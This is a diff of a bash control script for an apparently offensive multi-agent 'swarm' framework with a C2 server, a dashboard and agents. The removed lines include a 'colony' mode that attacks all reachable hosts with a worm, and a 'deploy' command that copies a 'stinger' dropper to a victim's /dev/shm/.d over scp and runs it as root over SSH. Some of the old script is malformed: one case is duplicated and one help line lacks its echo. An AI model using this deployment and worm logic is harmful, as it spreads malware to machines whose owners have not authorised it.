@@ -1,161 +1,108 @@
 #!/bin/bash
-# SWARM Control — multi-agent framework.
-# ./hive.sh brain    → C2 + dashboard (safe, solo operador)
-# ./hive.sh colony   → C2 + dashboard + agentes agresivos
-# ./hive.sh deploy   → desplegar stinger en víctima vía SSH
-# ./hive.sh stop     → matar todo
-# ./hive.sh status   → ver agentes vivos
-
+# Hive Colony Control CLI
+# Commands: dev | all | test | stop | status | build | clean
 set -euo pipefail
+
+# ── Paths ─────────────────────────────────────────────────────────────
 export OPENSSL_DIR="${OPENSSL_DIR:-/usr}"
 export OPENSSL_LIB_DIR="${OPENSSL_LIB_DIR:-/usr/lib/x86_64-linux-gnu}"
 export OPENSSL_INCLUDE_DIR="${OPENSSL_INCLUDE_DIR:-/usr/include}"
-
-GREEN='\033[0;32m'
-CYAN='\033[0;36m'
-RED='\033[0;31m'
-YELLOW='\033[1;33m'
-NC='\033[0m'
-BOLD='\033[1m'
-
 cd "$(dirname "$0")"
 
-_cleanup() {
-    pkill -f "dashboard.py" 2>/dev/null || true
-    pkill -f "c2_server.py" 2>/dev/null || true
-    pkill -f "target/debug/worker" 2>/dev/null || true
-    pkill -f "target/debug/drone" 2>/dev/null || true
-    pkill -f "target/debug/honeybee" 2>/dev/null || true
-    pkill -f "target/debug/weaver" 2>/dev/null || true
-    pkill -f "target/debug/queen" 2>/dev/null || true
-    pkill -f "target/debug/swarm" 2>/dev/null || true
-    pkill -f "buzz" 2>/dev/null || true
+ARENA_NAME="/hive_$(date +%s)_$$"
+GREEN='\033[0;32m' CYAN='\033[0;36m' RED='\033[0;31m' YELLOW='\033[1;33m' NC='\033[0m' BOLD='\033[1m'
+
+# ── Helpers ───────────────────────────────────────────────────────────
+_clean() {
+    pkill -f "dashboard.py\|c2_server.py" 2>/dev/null || true
+    pkill -f "target/debug/" 2>/dev/null || true
     sleep 1
+    rm -f /dev/shm/hive_*
 }
 
 _build() {
     echo -e "${GREEN}[build] Compiling...${NC}"
-    cargo build --workspace 2>&1 | tail -1
+    cargo build "$@" 2>&1 | grep -E "Compiling|Finished|error" || true
 }
 
-_launch_c2() {
-    echo -e "${GREEN}[c2] C2 Server :8443${NC}"
-    python3 tests/c2_server.py --port 8443 --no-tls > /dev/null 2>&1 &
-    sleep 1
+_agents() {
+    export __HIVE_ARENA="$ARENA_NAME"
+    target/debug/worker > /tmp/hive_worker.log 2>&1 &
+    target/debug/drone > /tmp/hive_drone.log 2>&1 &
+    target/debug/honeybee > /tmp/hive_honeybee.log 2>&1 &
+    target/debug/weaver > /tmp/hive_weaver.log 2>&1 &
 }
 
-_launch_dashboard() {
-    echo -e "${GREEN}[dash] Dashboard :8080${NC}"
-    python3 tests/dashboard.py --port 8080 > /dev/null 2>&1 &
-    sleep 1
-}
-
-_banner() {
-    local mode="$1"
-    echo ""
-    echo -e "${CYAN}╔══════════════════════════════════════════════╗${NC}"
-    echo -e "${CYAN}║   SWARM ${mode}${NC}"
-    echo -e "${CYAN}║   Dashboard: http://localhost:8080           ║${NC}"
-    echo -e "${CYAN}║   C2 API:    http://localhost:8443/health    ║${NC}"
-    echo -e "${CYAN}╚══════════════════════════════════════════════╝${NC}"
-    echo ""
-    echo "Press Ctrl+C to stop. Or run: ./hive.sh stop"
-}
-
+# ── Commands ──────────────────────────────────────────────────────────
 case "${1:-}" in
-    brain)
-        _cleanup
-        _build
-        _launch_c2
-        _launch_dashboard
-        _banner "BRAIN (safe mode)"
-        echo -e "${YELLOW}Brain mode: C2 + dashboard only. No agents launched.${NC}"
-        echo -e "${YELLOW}Your IP is protected in hive.toml [brain] safe_ips${NC}"
-        sleep infinity
-        ;;
-
-    passive)
-        _cleanup
-        _build
-        _launch_c2
-        _launch_dashboard
-        _banner "PASSIVE (recon only)"
-        echo -e "${CYAN}Passive mode: Worker + Guardian only. No attacks.${NC}"
-        echo -e "${CYAN}Maps network, discovers hosts, generates ATT&CK report.${NC}"
-        sed -i "s/aggressive = true/aggressive = false/" hive.toml 2>/dev/null || true
-        cargo run -p buzz &
-        wait $! 2>/dev/null || true
-        ;;
-
-    colony)
-        _cleanup
-        if ! grep -q "aggressive = true" hive.toml 2>/dev/null; then
-            echo -e "${YELLOW}Enabling colony aggressive mode...${NC}"
-            sed -i "s/aggressive = false/aggressive = true/" hive.toml 2>/dev/null || true
-        fi
-        _build
-        _launch_c2
-        _launch_dashboard
-        _banner "COLONY (aggressive)"
-        echo -e "${RED}AGENTS + SWARM: attacking all reachable hosts${NC}"
-        echo -e "${RED}Safe IPs protected: $(grep -A5 "[brain]" hive.toml | grep safe_ips -A10 | grep """ | tr "
-" " " 2>/dev/null)${NC}"
+    # ── dev: solo agentes, sin C2, directo a terminal ─────────────────
+    dev)
+        _clean
+        _build -p worker -p drone -p honeybee -p weaver
+        echo -e "${CYAN}╔══════════════════════════╗${NC}"
+        echo -e "${CYAN}║   HIVE DEV MODE          ║${NC}"
+        echo -e "${CYAN}╚══════════════════════════╝${NC}"
         echo ""
-        cargo run -p buzz &
-        SWARM_PID=$!
-        wait $SWARM_PID 2>/dev/null || true
-        ;;
-
-    colony)
-        _cleanup
-        # Enable aggressive mode in config
-        if ! grep -q "aggressive = true" hive.toml 2>/dev/null; then
-            echo -e "${YELLOW}Enabling colony aggressive mode...${NC}"
-            sed -i 's/aggressive = false/aggressive = true/' hive.toml 2>/dev/null || true
-        fi
-        _build
-        _launch_c2
-        _launch_dashboard
-        _banner "COLONY (aggressive)"
-        echo -e "${RED}AGENTS + WORM: attacking all reachable hosts${NC}"
-        echo -e "${RED}Safe IPs protected: $(grep -A5 '\[brain\]' hive.toml | grep safe_ips -A10 | grep '"' | tr '\n' ' ')${NC}"
+        export __HIVE_ARENA="$ARENA_NAME"
+        echo -e "${GREEN}Worker${NC}" && target/debug/worker 2>&1 &
+        sleep 2
+        echo -e "${GREEN}Drone${NC}"  && target/debug/drone 2>&1 &
+        sleep 1
+        echo -e "${GREEN}Honeybee${NC}" && target/debug/honeybee 2>&1 &
+        sleep 1
+        echo -e "${GREEN}Weaver${NC}" && target/debug/weaver 2>&1 &
         echo ""
-        cargo run -p buzz &
-        SWARM_PID=$!
-        wait $SWARM_PID 2>/dev/null || true
+        echo -e "${YELLOW}Agents running. Ctrl+C to stop.${NC}"
+        wait
         ;;
 
-    deploy)
-        target="${2:-}"
-        if [[ -z "$target" ]]; then
-            echo "Usage: ./hive.sh deploy <victim-ip>"
-            echo "  ./hive.sh deploy 192.168.1.50"
-            exit 1
-        fi
+    # ── all: stack completo (C2 + dashboard + agentes) ────────────────
+    all)
+        _clean
         _build
-        echo -e "${GREEN}Deploying stinger to $target...${NC}"
-        # Compile stinger and SCP to target, then SSH exec
-        cargo build -p stinger 2>&1 | tail -1
-        if [[ -f "target/debug/stinger" ]]; then
-            scp target/debug/stinger "root@$target:/dev/shm/.d" 2>/dev/null && \
-            ssh "root@$target" "chmod +x /dev/shm/.d && /dev/shm/.d" 2>/dev/null && \
-            echo -e "${GREEN}Deployed to $target. Swarm will activate.${NC}" || \
-            echo -e "${RED}Deploy failed. Check SSH access to $target${NC}"
-        else
-            echo -e "${RED}Dropper binary not found. Build failed.${NC}"
-        fi
+        echo -e "${CYAN}╔══════════════════════════════════════╗${NC}"
+        echo -e "${CYAN}║   HIVE FULL STACK                    ║${NC}"
+        echo -e "${CYAN}║   Dashboard: http://localhost:8080   ║${NC}"
+        echo -e "${CYAN}║   C2 API:    http://localhost:8443   ║${NC}"
+        echo -e "${CYAN}╚══════════════════════════════════════╝${NC}"
+        echo ""
+        python3 tests/c2_server.py --port 8445 --no-tls > /tmp/hive_c2.log 2>&1 &
+        python3 tests/dashboard.py --port 8080 > /tmp/hive_dash.log 2>&1 &
+        sleep 2
+        export __HIVE_ARENA="$ARENA_NAME"
+        _agents
+        sleep 3
+        echo -e "${GREEN}4 agents + C2 + dashboard running.${NC}"
+        echo -e "${YELLOW}Ctrl+C to stop. ./hive.sh stop${NC}"
+        wait
         ;;
 
+    # ── test: ejecutar todos los tests ────────────────────────────────
+    test)
+        echo -e "${CYAN}Running tests...${NC}"
+        export PATH="/tmp/pkgconf/usr/bin:${PATH:-}"
+        export LD_LIBRARY_PATH="/tmp/pkgconf/usr/lib/x86_64-linux-gnu:${LD_LIBRARY_PATH:-}"
+        cargo test --workspace 2>&1 | grep -E "test result|FAILED|running"
+        echo -e "${GREEN}Done.${NC}"
+        ;;
+
+    # ── e2e: test end-to-end ──────────────────────────────────────────
+    e2e)
+        export PATH="/tmp/pkgconf/usr/bin:${PATH:-}"
+        export LD_LIBRARY_PATH="/tmp/pkgconf/usr/lib/x86_64-linux-gnu:${LD_LIBRARY_PATH:-}"
+        bash hive_test.sh
+        ;;
+
+    # ── stop: matar todo ──────────────────────────────────────────────
     stop)
-        _cleanup
-        echo -e "${GREEN}All swarm processes stopped.${NC}"
+        _clean
+        echo -e "${GREEN}Hive stopped.${NC}"
         ;;
 
+    # ── status: ver agentes vivos ─────────────────────────────────────
     status)
-        echo -e "${BOLD}=== SWARM STATUS ===${NC}"
-        echo ""
-        printf "%-10s %-8s %s\n" "ROLE" "PID" "MEMORY"
-        printf "%-10s %-8s %s\n" "----------" "--------" "------"
+        printf "%-10s %-8s %s\n" "AGENT" "PID" "MEM"
+        printf "%-10s %-8s %s\n" "----------" "--------" "----"
         for role in worker drone honeybee weaver queen swarm; do
             pids=$(pgrep -f "target/debug/$role" 2>/dev/null || true)
             if [[ -n "$pids" ]]; then
@@ -169,43 +116,46 @@ case "${1:-}" in
         done
         echo ""
         echo "Dashboard: $(curl -s -o /dev/null -w '%{http_code}' http://127.0.0.1:8080 2>/dev/null || echo 'down')"
-        echo "C2:        $(curl -s -o /dev/null -w '%{http_code}' http://127.0.0.1:8443/health 2>/dev/null || echo 'down')"
         ;;
 
-    dashboard)
-        python3 tests/dashboard.py --port 8080
-        ;;
-
-    test)
-        cargo test --workspace 2>&1 | grep -E "test result|FAILED"
-        ;;
-
+    # ── build: compilar ───────────────────────────────────────────────
     build)
-        cargo build --workspace
+        _build --workspace
+        echo -e "${GREEN}Build complete.${NC}"
         ;;
 
+    # ── clean: limpiar ────────────────────────────────────────────────
+    clean)
+        _clean
+        cargo clean
+        echo -e "${GREEN}Cleaned.${NC}"
+        ;;
+
+    # ── help ──────────────────────────────────────────────────────────
     *)
-        echo -e "${CYAN}SWARM Control${NC}"
+        echo -e "${CYAN}╔══════════════════════════════════════╗${NC}"
+        echo -e "${CYAN}║   HIVE COLONY v3.0                   ║${NC}"
+        echo -e "${CYAN}╚══════════════════════════════════════╝${NC}"
         echo ""
-        echo "Usage: ./hive.sh <command>"
+        echo -e "${BOLD}Quick Start:${NC}"
+        echo "  source build_env.sh          # Set up environment"
+        echo "  pip install -r requirements.txt  # Python deps"
+        echo "  ./hive.sh build              # Compile"
+        echo "  ./hive.sh dev                # Dev mode: agents only"
+        echo "  ./hive.sh all                # Full stack: C2 + dashboard + agents"
         echo ""
-        echo -e "${BOLD}Operating modes:${NC}"
-        echo "  brain     C2 + dashboard only (safe, no agents)"
-  passive   C2 + dashboard + recon only (no attacks)
-        echo "  colony    C2 + dashboard + AGGRESSIVE agents + swarm"
-        echo "  deploy    Deploy stinger to remote victim via SCP/SSH"
+        echo -e "${BOLD}Commands:${NC}"
+        echo "  dev     Launch 4 agents in terminal (safest)"
+        echo "  all     Full stack: C2 + dashboard + agents"
+        echo "  test    Run all 80 tests"
+        echo "  e2e     End-to-end integration test"
+        echo "  stop    Kill all hive processes"
+        echo "  status  Show running agents"
+        echo "  build   Compile workspace"
+        echo "  clean   Kill processes + cargo clean"
         echo ""
-        echo -e "${BOLD}Utilities:${NC}"
-        echo "  stop      Kill all swarm processes"
-        echo "  status    Show running agents"
-        echo "  dashboard Launch dashboard only"
-        echo "  test      Run all 28 tests"
-        echo "  build     Build workspace"
-        echo ""
-        echo -e "${BOLD}Examples:${NC}"
-        echo "  ./hive.sh brain                # Safe: just monitor"
-        echo "  ./hive.sh colony               # Aggressive: attack all hosts"
-        echo "  ./hive.sh deploy 192.168.1.50  # Infect a victim"
-        echo "  ./hive.sh status               # See what's running"
+        echo -e "${BOLD}After launching:${NC}"
+        echo "  Dashboard: http://localhost:8080"
+        echo "  C2 Health: http://localhost:8445/health"
         ;;
 esac
